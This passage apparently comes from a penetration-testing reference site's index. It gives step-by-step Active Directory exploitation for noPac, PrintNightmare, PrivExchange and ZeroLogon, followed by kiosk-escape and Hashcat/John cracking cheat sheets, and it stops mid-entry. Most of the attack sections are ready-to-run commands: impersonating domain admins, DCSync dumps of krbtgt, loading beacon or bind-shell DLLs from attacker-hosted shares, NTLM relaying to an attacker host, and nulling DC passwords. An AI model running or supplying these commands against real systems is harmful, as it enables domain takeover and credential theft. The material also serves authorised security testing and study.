<li>Check if the DC is vulnerable   <pre><code>crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac\n</code></pre></li> </ol> <p>Exploitation</p> <ol> <li>Create a computer account     <pre><code>impacket@linux&gt; addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'\n\npowermad@windows&gt; . .\\Powermad.ps1\npowermad@windows&gt; $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force\npowermad@windows&gt; New-MachineAccount -MachineAccount \"ControlledComputer\" -Password $($password) -Domain \"domain.local\" -DomainController \"DomainController.domain.local\" -Verbose\n\nsharpmad@windows&gt; Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword\n</code></pre></li> <li>Clear the controlled machine account <code>servicePrincipalName</code> attribute     <pre><code>impacket@linux&gt; addspn.py -u 'domain\\user' -p 'password' -t 'ControlledComputer$' -c DomainController\n\npowershell@windows&gt; . .\\Powerview.ps1\npowershell@windows&gt; Set-DomainObject \"CN=ControlledComputer,CN=Computers,DC=domain,DC=local\" -Clear 'serviceprincipalname' -Verbose\n</code></pre></li> <li>(CVE-2021-42278) Change the controlled machine account <code>sAMAccountName</code> to a Domain Controller's name without the trailing <code>$</code> <pre><code># https://github.com/SecureAuthCorp/impacket/pull/1224\nimpacket@linux&gt; renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'\n\npowermad@windows&gt; Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"DomainController\" -Attribute samaccountname -Verbose\n</code></pre></li> <li>Request a TGT for the controlled machine account     <pre><code>impacket@linux&gt; getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'\n\ncmd@windows&gt; Rubeus.exe asktgt /user:\"DomainController\" /password:\"ComputerPassword\" /domain:\"domain.local\" /dc:\"DomainController.domain.local\" /nowrap\n</code></pre></li> <li>Reset the controlled machine account sAMAccountName to its old value      <pre><code>impacket@linux&gt; renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'\n\npowermad@windows&gt; Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"ControlledComputer\" -Attribute samaccountname -Verbose\n</code></pre></li> <li>(CVE-2021-42287) Request a service ticket with <code>S4U2self</code> by presenting the TGT obtained before     <pre><code># https://github.com/SecureAuthCorp/impacket/pull/1202\nimpacket@linux&gt; KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'\n\ncmd@windows&gt; Rubeus.exe s4u /self /impersonateuser:\"DomainAdmin\" /altservice:\"ldap/DomainController.domain.local\" /dc:\"DomainController.domain.local\" /ptt /ticket:[Base64 TGT]\n</code></pre></li> <li>DCSync: <code>KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'</code></li> </ol> <p>Automated exploitation:</p> <ul> <li>cube0x0/noPac - Windows     <pre><code>noPac.exe scan -domain htb.local -user user -pass 'password123'\nnoPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt\nnoPac.exe -domain htb.local -user domain_user -pass \"Password123!\" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator\n</code></pre></li> <li>Ridter/noPac - Linux   <pre><code>python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump\n</code></pre></li> <li>WazeHell/sam-the-admin <pre><code>$ python3 sam_the_admin.py \"domain/user:password\" -dc-ip 10.10.10.10 -shell\n[*] Selected Target dc.caltech.white                                              \n[*] Total Domain Admins 11                                                        \n[*] will try to impersonat gaylene.dreddy                                         \n[*] Current ms-DS-MachineAccountQuota = 10                                        \n[*] Adding Computer Account \"SAMTHEADMIN-11$\"                                     \n[*] MachineAccount \"SAMTHEADMIN-11$\" password = EhFMT%mzmACL                      \n[*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL.\n[*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white   \n[*] SAMTHEADMIN-11$ sAMAccountName == dc                                          \n[*] Saving ticket in dc.ccache                                                    \n[*] Resting the machine account to SAMTHEADMIN-11$                                \n[*] Restored SAMTHEADMIN-11$ sAMAccountName to original value                     \n[*] Using TGT from cache                                                          \n[*] Impersonating gaylene.dreddy                                                  \n[*]     Requesting S4U2self                                                       \n[*] Saving ticket in gaylene.dreddy.ccache                                        \n[!] Launching semi-interactive shell - Careful what you execute                   \nC:\\Windows\\system32&gt;whoami                                                        \nnt authority\\system \n</code></pre></li> <li>ly4k/Pachine <pre><code>usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local]\n              [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip]\n              [domain/]username[:password]\n$ python3 pachine.py -dc-host dc.domain.local -scan 'domain.local/john:Passw0rd!'\n$ python3 pachine.py -dc-host dc.domain.local -spn cifs/dc.domain.local -impersonate administrator 'domain.local/john:Passw0rd!'\n$ export KRB5CCNAME=$PWD/administrator@domain.local.ccache\n$ impacket-psexec -k -no-pass 'domain.local/administrator@dc.domain.local'\n</code></pre></li> </ul> <p>Mitigations:</p> <ul> <li>KB5007247 - Windows Server 2012 R2</li> <li>KB5008601 - Windows Server 2016</li> <li>KB5008602 - Windows Server 2019</li> <li>KB5007205 - Windows Server 2022</li> <li>KB5008102</li> <li>KB5008380</li> </ul>"},{"location":"active-directory/CVE/NoPAC/#references","title":"References","text":"<ul> <li>sAMAccountName spoofing - The Hacker Recipes</li> </ul>"},{"location":"active-directory/CVE/PrintNightmare/","title":"PrintNightmare","text":"<p>CVE-2021-1675 / CVE-2021-34527</p> <p>The DLL will be stored in <code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\</code>. The exploit will execute the DLL either from the local filesystem or a remote share.</p> <p>Requirements:</p> <ul> <li>Spooler Service enabled (Mandatory)</li> <li>Server with patches &lt; June 2021</li> <li>DC with <code>Pre Windows 2000 Compatibility</code> group</li> <li>Server with registry key <code>HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\\NoWarningNoElevationOnInstall</code> = (DWORD) 1</li> <li>Server with registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA</code> = (DWORD) 0</li> </ul> <p>Detect the vulnerability:</p> <ul> <li>Impacket - rpcdump <pre><code>python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'\nProtocol: [MS-RPRN]: Print System Remote Protocol\n</code></pre></li> <li>It Was All A Dream <pre><code>git clone https://github.com/byt3bl33d3r/ItWasAllADream\ncd ItWasAllADream &amp;&amp; poetry install &amp;&amp; poetry shell\nitwasalladream -u user -p Password123 -d domain 10.10.10.10/24\ndocker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10\n</code></pre></li> </ul> <p>Payload Hosting: </p> <ul> <li>The payload can be hosted on Impacket SMB server since PR #1109:   <pre><code>python3 ./smbserver.py share /tmp/smb/\n</code></pre></li> <li>Using Invoke-BuildAnonymousSMBServer (Admin rights required on host):    <pre><code>Import-Module .\\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\\Share -Mode Enable\n</code></pre></li> <li>Using WebDav with SharpWebServer (Doesn't require admin rights):   <pre><code>SharpWebServer.exe port=8888 dir=c:\\users\\public verbose=true\n</code></pre></li> </ul> <p>When using WebDav instead of SMB, you must add <code>@[PORT]</code> to the hostname in the URI, e.g.: <code>\\\\172.16.1.5@8888\\Downloads\\beacon.dll</code> WebDav client must be activated on exploited target. By default it is not activated on Windows workstations (you have to <code>net start webclient</code>) and it's not installed on servers. Here is how to detect activated webdav:</p> <pre><code>cme smb -u user -p password -d domain.local -M webdav [TARGET]\n</code></pre> <p>Trigger the exploit: </p> <ul> <li>SharpNightmare <pre><code># require a modified Impacket: https://github.com/cube0x0/impacket\npython3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll'\npython3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\\addCube.dll'\n## LPE\nSharpPrintNightmare.exe C:\\addCube.dll\n## RCE using existing context\nSharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_addb31f9bff9e936\\Amd64\\UNIDRV.DLL' '\\\\192.168.1.20'\n## RCE using runas /netonly\nSharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll'  'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL' '\\\\192.168.1.10' hackit.local domain_user Pass123\n</code></pre></li> <li>Invoke-Nightmare <pre><code>## LPE only (PS1 + DLL)\nImport-Module .\\cve-2021-1675.ps1\nInvoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default\nInvoke-Nightmare -DriverName \"Dementor\" -NewUser \"d3m3nt0r\" -NewPassword \"AzkabanUnleashed123*\" \nInvoke-Nightmare -DLL \"C:\\absolute\\path\\to\\your\\bindshell.dll\"\n</code></pre></li> <li>Mimikatz v2.2.0-20210709+ <pre><code>## LPE\nmisc::printnightmare /server:DC01 /library:C:\\Users\\user1\\Documents\\mimispool.dll\n## RCE\nmisc::printnightmare /server:CASTLE /library:\\\\10.0.2.12\\smb\\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50\n</code></pre></li> <li>PrintNightmare - @outflanknl <pre><code>PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password]\n</code></pre></li> </ul> <p>Debug informations</p> Error Message Debug 0x5 <code>rpc_s_access_denied</code> Permissions on the file in the SMB share 0x525 <code>ERROR_NO_SUCH_USER</code> The specified account does not exist. 0x180 unknown error code Share is not SMB2"},{"location":"active-directory/CVE/PrintNightmare/#references","title":"References","text":"<ul> <li>Playing with PrintNightmare - 0xdf - Jul 8, 2021</li> </ul>"},{"location":"active-directory/CVE/PrivExchange/","title":"PrivExchange","text":"<p>Exchange your privileges for Domain Admin privs by abusing Exchange.    You need a shell on a user account with a mailbox.</p> <ol> <li> <p>Exchange server hostname or IP address</p> <pre><code>pth-net rpc group members \"Exchange Servers\" -I dc01.domain.local -U domain/username\n</code></pre> </li> <li> <p>Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).</p> <pre><code>ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username\n</code></pre> </li> <li> <p>Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server's to send back its NTLMv2 hash to a controlled machine.</p> <pre><code># https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py\npython privexchange.py -ah xxxxxxx -u xxxx -d xxxxx\npython privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange\n\n# https://github.com/G0ldenGunSec/PowerPriv \npowerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016\n</code></pre> </li> <li> <p>Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user's NTLM hash</p> <pre><code>python secretsdump.py xxxxxxxxxx -just-dc\npython secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm\n</code></pre> </li> <li> <p>Clean your mess and restore a previous state of the user's ACL</p> <pre><code>python aclpwn.py --restore ../aclpwn-20190319-125741.restore\n</code></pre> </li> </ol> <p>Alternatively you can use the Metasploit module </p> <p><code>use auxiliary/scanner/http/exchange_web_server_pushsubscription</code></p> <p>Alternatively you can use an all-in-one tool : Exchange2domain.</p> <pre><code>git clone github.com/Ridter/Exchange2domain \npython Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip\npython Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip\n</code></pre>"},{"location":"active-directory/CVE/PrivExchange/#references","title":"References","text":"<ul> <li>Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema</li> <li>Exploiting PrivExchange - April 11, 2019 - @chryzsh</li> <li>[PrivExchange] From user to domain admin in less than 60sec ! - davy</li> <li>Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave</li> </ul>"},{"location":"active-directory/CVE/ZeroLogon/","title":"ZeroLogon","text":"<p>CVE-2020-1472</p> <p>White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055</p> <p>Exploit steps from the white paper</p> <ol> <li>Spoofing the client credential</li> <li>Disabling signing and sealing</li> <li>Spoofing a call</li> <li>Changing a computer's AD password to null</li> <li>From password change to domain admin</li> <li> <p> reset the computer's AD password in a proper way to avoid any Deny of Service</p> </li> <li> <p><code>cve-2020-1472-exploit.py</code> - Python script from dirkjanm <pre><code>  # Check (https://github.com/SecuraBV/CVE-2020-1472)\n  proxychains python3 zerologon_tester.py DC01 172.16.1.5\n\n$ git clone https://github.com/dirkjanm/CVE-2020-1472.git\n\n# Activate a virtual env to install impacket\n$ python3 -m venv venv\n$ source venv/bin/activate\n$ pip3 install .\n\n# Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)\nproxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5\n\n# Find the old NT hash of the DC\nproxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'\n\n# Restore password from secretsdump \n# secretsdump will automatically dump the plaintext machine password (hex encoded) \n# when dumping the local registry secrets on the newest version\npython restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3\ndeactivate\n</code></pre></p> </li> <li> <p><code>nccfsas</code> - .NET binary for Cobalt Strike's execute-assembly   <pre><code>git clone https://github.com/nccgroup/nccfsas\n# Check\nexecute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local\n\n# Resetting the machine account password\nexecute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset\n\n# Testing from a non Domain-joined machine\nexecute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch\n\n# Now reset the password back\n</code></pre></p> </li> <li> <p><code>Mimikatz</code> - 2.2.0 20200917 Post-Zerologon   <pre><code>privilege::debug\n# Check for the CVE\nlsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$\n\n# Exploit the CVE and set the computer account's password to \"\"\nlsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit\n\n# Execute dcsync to extract some hashes\nlsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:\"\" /authntlm\nlsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:\"\" /authntlm\n\n# Pass The Hash with the extracted Domain Admin hash\nsekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN\n\n# Use IP address instead of FQDN to force NTLM with Windows APIs \n# Reset password to Waza1234/Waza1234/Waza1234/\n# https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584\nlsadump::postzerologon /target:10.10.10.10 /account:DC01$\n</code></pre></p> </li> <li> <p><code>CrackMapExec</code> - only check   <pre><code>crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon\n</code></pre></p> </li> </ol> <p>A 2nd approach to exploit zerologon is done by relaying authentication.</p> <p>This technique, found by dirkjanm, requires more prerequisites but has the advantage of having no impact on service continuity. The following prerequisites are needed: * A domain account * One DC running the <code>PrintSpooler</code> service * Another DC vulnerable to zerologon</p> <ul> <li><code>ntlmrelayx</code> - from Impacket and any tool such as <code>printerbug.py</code> <pre><code># Check if one DC is running the PrintSpooler service\nrpcdump.py 10.10.10.10 | grep -A 6 \"spoolsv\"\n\n# Setup ntlmrelay in one shell\nntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support\n\n#Trigger printerbug in 2nd shell\npython3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12\n</code></pre></li> </ul>"},{"location":"active-directory/CVE/ZeroLogon/#references","title":"References","text":"<ul> <li>Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020</li> </ul>"},{"location":"cheatsheets/escape-breakout/","title":"Application Escape and Breakout","text":""},{"location":"cheatsheets/escape-breakout/#summary","title":"Summary","text":"<ul> <li>Gaining a command shell</li> <li>Sticky Keys</li> <li>Dialog Boxes<ul> <li>Creating new files</li> <li>Open a new Windows Explorer instance</li> <li>Exploring Context Menus</li> <li>Save as</li> <li>Input Boxes</li> <li>Bypass file restrictions</li> </ul> </li> <li>Internet Explorer</li> <li>Shell URI Handlers</li> <li>References</li> </ul>"},{"location":"cheatsheets/escape-breakout/#gaining-a-command-shell","title":"Gaining a command shell","text":"<ul> <li>Shortcut<ul> <li>[Window] + [R] -&gt; cmd </li> <li>[CTRL] + [SHIFT] + [ESC] -&gt; Task Manager</li> <li>[CTRL] + [ALT] + [DELETE] -&gt; Task Manager </li> </ul> </li> <li>Access through file browser: Browsing to the folder containing the binary (i.e. <code>C:\\windows\\system32\\</code>), we can simply right click and <code>open</code> it</li> <li>Drag-and-drop: dragging and dropping any file onto the cmd.exe </li> <li>Hyperlink: <code>file:///c:/Windows/System32/cmd.exe</code></li> <li>Task Manager: <code>File</code> &gt; <code>New Task (Run...)</code> &gt; <code>cmd</code></li> <li>MSPAINT.exe<ul> <li>Open MSPaint.exe and set the canvas size to: <code>Width=6</code> and <code>Height=1</code> pixels</li> <li>Zoom in to make the following tasks easier</li> <li>Using the colour picker, set pixels values to (from left to right):     <pre><code>1st: R: 10,  G: 0,   B: 0\n2nd: R: 13,  G: 10,  B: 13\n3rd: R: 100, G: 109, B: 99\n4th: R: 120, G: 101, B: 46\n5th: R: 0,   G: 0,   B: 101\n6th: R: 0,   G: 0,   B: 0\n</code></pre></li> <li>Save it as 24-bit Bitmap (.bmp;.dib)</li> <li>Change its extension from bmp to bat and run </li> </ul> </li> </ul>"},{"location":"cheatsheets/escape-breakout/#sticky-keys","title":"Sticky Keys","text":"<ul> <li>Spawn the sticky keys dialog<ul> <li>Via Shell URI : <code>shell:::{20D04FE0-3AEA-1069-A2D8-08002B30309D}</code></li> <li>Hit 5 times [SHIFT]</li> </ul> </li> <li>Visit \"Ease of Access Center\"</li> <li>You land on \"Setup Sticky Keys\", move up a level on \"Ease of Access Center\"</li> <li>Start the OSK (On-Screen-Keyboard)</li> <li>You can now use the keyboard shortcut (CTRL+N)</li> </ul>"},{"location":"cheatsheets/escape-breakout/#dialog-boxes","title":"Dialog Boxes","text":""},{"location":"cheatsheets/escape-breakout/#creating-new-files","title":"Creating new files","text":"<ul> <li>Batch files \u2013 Right click &gt; New &gt; Text File &gt; rename to .BAT (or .CMD) &gt; edit &gt; open</li> <li>Shortcuts \u2013 Right click &gt; New &gt; Shortcut &gt; <code>%WINDIR%\\system32</code></li> </ul>"},{"location":"cheatsheets/escape-breakout/#open-a-new-windows-explorer-instance","title":"Open a new Windows Explorer instance","text":"<ul> <li>Right click any folder &gt; select <code>Open in new window</code></li> </ul>"},{"location":"cheatsheets/escape-breakout/#exploring-context-menus","title":"Exploring Context Menus","text":"<ul> <li>Right click any file/folder and explore context menus</li> <li>Clicking <code>Properties</code>, especially on shortcuts, can yield further access via <code>Open File Location</code></li> </ul>"},{"location":"cheatsheets/escape-breakout/#save-as","title":"Save as","text":"<ul> <li>\"Save as\" / \"Open as\" option</li> <li>\"Print\" feature \u2013 selecting \"print to file\" option (XPS/PDF/etc)</li> <li><code>\\\\127.0.0.1\\c$\\Windows\\System32\\</code> and execute <code>cmd.exe</code></li> </ul>"},{"location":"cheatsheets/escape-breakout/#input-boxes","title":"Input Boxes","text":"<p>Many input boxes accept file paths; try all inputs with UNC paths such as <code>//attacker\u2013pc/</code> or <code>//127.0.0.1/c$</code> or <code>C:\\</code></p>"},{"location":"cheatsheets/escape-breakout/#bypass-file-restrictions","title":"Bypass file restrictions","text":"<p>Enter . or *.exe or similar in <code>File name</code> box</p>"},{"location":"cheatsheets/escape-breakout/#internet-explorer","title":"Internet Explorer","text":""},{"location":"cheatsheets/escape-breakout/#download-and-runopen","title":"Download and Run/Open","text":"<ul> <li>Text files -&gt; opened by Notepad</li> </ul>"},{"location":"cheatsheets/escape-breakout/#menus","title":"Menus","text":"<ul> <li>The address bar</li> <li>Search menus</li> <li>Help menus</li> <li>Print menus</li> <li>All other menus that provide dialog boxes</li> </ul>"},{"location":"cheatsheets/escape-breakout/#accessing-filesystem","title":"Accessing filesystem","text":"<p>Enter these paths in the address bar:</p> <ul> <li>file://C:/windows</li> <li>C:/windows/</li> <li>%HOMEDRIVE%</li> <li>\\127.0.0.1\\c$\\Windows\\System32</li> </ul>"},{"location":"cheatsheets/escape-breakout/#unassociated-protocols","title":"Unassociated Protocols","text":"<p>It is possible to escape a browser based kiosk with other protocols than usual <code>http</code> or <code>https</code>.  If you have access to the address bar, you can use any known protocol (<code>irc</code>, <code>ftp</code>, <code>telnet</code>, <code>mailto</code>, etc.)  to trigger the open with prompt and select a program installed on the host. The program will than be launched with the uri as a parameter, you need to select a program that will not crash when recieving it. It is possible to send multiple parameters to the program by adding spaces in your uri.</p> <p>Note: This technique required that the protocol used is not already associated with a program.</p> <p>Example - Launching Firefox with a custom profile:</p> <p>This is a nice trick since Firefox launched with the custom profile may not be as much hardened as the default profile.</p> <ol> <li>Firefox need to be installed.</li> <li>Enter the following uri in the address bar: <code>irc://127.0.0.1 -P \"Test\"</code></li> <li>Press enter to navigate to the uri.</li> <li>Select the firefox program.</li> <li>Firefox will be launched with the profile <code>Test</code>. </li> </ol> <p>In this example, it's the equivalent of running the following command: <pre><code>firefox irc://127.0.0.1 -P \"Test\"\n</code></pre></p>"},{"location":"cheatsheets/escape-breakout/#shell-uri-handlers","title":"Shell URI Handlers","text":"<ul> <li>shell:DocumentsLibrary</li> <li>shell:Librariesshell:UserProfiles</li> <li>shell:Personal</li> <li>shell:SearchHomeFolder</li> <li>shell:System shell:NetworkPlacesFolder</li> <li>shell:SendTo</li> <li>shell:Common Administrative Tools</li> <li>shell:MyComputerFolder</li> <li>shell:InternetFolder</li> </ul>"},{"location":"cheatsheets/escape-breakout/#references","title":"References","text":"<ul> <li>PentestPartners - Breaking out of Citrix and other restricted desktop environments</li> <li>Breaking Out! of Applications Deployed via Terminal Services, Citrix, and Kiosks - Scott Sutherland - May 22nd, 2013</li> <li>Escaping from KIOSKs - HackTricks</li> <li>Breaking out of Windows Kiosks using only Microsoft Edge - Firat Acar - May 24, 2022</li> <li>HOW TO LAUNCH COMMAND PROMPT AND POWERSHELL FROM MS PAINT - 2022-05-14 - Rickard</li> </ul>"},{"location":"cheatsheets/hash-cracking/","title":"Hash Cracking","text":""},{"location":"cheatsheets/hash-cracking/#summary","title":"Summary","text":"<ul> <li>Hashcat</li> <li>Hashcat Example Hashes</li> <li>Hashcat Install</li> <li>Mask attack</li> <li>Dictionary</li> <li>John</li> <li>Usage</li> <li>Rainbow tables</li> <li>Tips and Tricks</li> <li>Online Cracking Resources</li> <li>References</li> </ul>"},{"location":"cheatsheets/hash-cracking/#hashcat","title":"Hashcat","text":""},{"location":"cheatsheets/hash-cracking/#hashcat-install","title":"Hashcat Install","text":"<pre><code>apt install cmake build-essential -y\napt install checkinstall git -y\ngit clone https://github.com/hashcat/hashcat.git &amp;&amp; cd hashcat &amp;&amp; make -j 8 &amp;&amp; make install\n</code></pre> <ol> <li>Extract the hash</li> <li>Get the hash format: https://hashcat.net/wiki/doku.php?id=example_hashes</li> <li>Establish a cracking stratgy based on hash format (ex: wordlist -&gt; wordlist + rules -&gt; mask -&gt; combinator mode -&gt; prince attack -&gt; ...)</li> <li>Enjoy plains</li> <li>Review strategy</li> <li>Start over</li> </ol>"},{"location":"cheatsheets/hash-cracking/#dictionary","title":"Dictionary","text":"<p>Every word of a given list (a.k.a. dictionary) is hashed and compared against the target hash.</p> <pre><code>hashcat --attack-mode 0 --hash-type $number $hashes_file $wordlist_file -r $my_rules\n</code></pre> <ul> <li> <p>Wordlists</p> <ul> <li>packetstorm</li> <li>weakpass_3a</li> <li>weakpass_3</li> <li>Hashes.org</li> <li>kerberoast_pws</li> <li>hashmob.net</li> <li>clem9669/wordlists</li> </ul> </li> <li> <p>Rules</p> <ul> <li>One Rule to Rule Them All</li> <li>nsa-rules</li> <li>hob064</li> <li>d3adhob0</li> <li>clem9669/hashcat-rule</li> </ul> </li> </ul>"},{"location":"cheatsheets/hash-cracking/#mask-attack","title":"Mask attack","text":"<p>Mask attack is an attack mode which optimize brute-force.</p> <p>Every possibility for a given character set and a given length (i.e. aaa, aab, aac, ...) is hashed and compared against the target hash.</p> <pre><code># Mask: upper*1+lower*5+digit*2 and upper*1+lower*6+digit*2 \nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d \nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?l?d?d?1\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?l?l?d?d?1 \n\n# Mask: upper*1+lower*3+digit*4 and upper*1+lower*3+digit*4\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?d?d?d?d\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?d?d?d?d\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d?d?d\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?d?d?d?d?1\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?d?d?d?d?1\n\n# Mask: lower*6 + digit*2 + special digit(+!?*)\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?l?l?l?l?l?l?d?d?1\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?l?l?l?l?l?l?d?d?1?1\n\n# Mask: lower*6 + digit*2\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 /content/hashcat/masks/8char-1l-1u-1d-1s-compliant.hcmask\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 ?l?d?u ?1?1?1?1?1?1?1?1\n\n# Other examples\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a?a\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a \nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d?d?d\nhashcat --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type $number $hashes_file \"?a?a?a?a?a?a?a?a?a?a?a?a\"\nhashcat --attack-mode 3 --hash-type $number $hashes_file \"?u?l?l?l?d?d?d?d?s\"\nhashcat --attack-mode 3 --hash-type $number $hashes_file \"?a?a?a?a?a?a?a?a\"\nhashcat --attack-mode 3 --custom-charset1 \"?u\" --custom-charset2 \"?l?u?d\" --custom-charset3 \"?d\" --hash-type $number $hashes_file \"?1?2?2?2?3\"\n</code></pre> Shortcut Characters ?l abcdefghijklmnopqrstuvwxyz ?u ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d 0123456789 ?s !\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[]^_`{}~ ?a ?l?u?d?s ?b 0x00 - 0xff"},{"location":"cheatsheets/hash-cracking/#john","title":"John","text":""},{"location":"cheatsheets/hash-cracking/#john-usage","title":"John Usage","text":"<pre><code># Run on password file containing hashes to be cracked\njohn passwd\n\n# Use a specific wordlist\njohn --wordlist=&lt;wordlist&gt; passwd\n\n# Use a specific wordlist with rules\njohn --wordlist=&lt;wordlist&gt; passwd --rules=Jumbo\n\n# Show cracked passwords\njohn --show passwd\n\n# Restore interrupted sessions\njohn 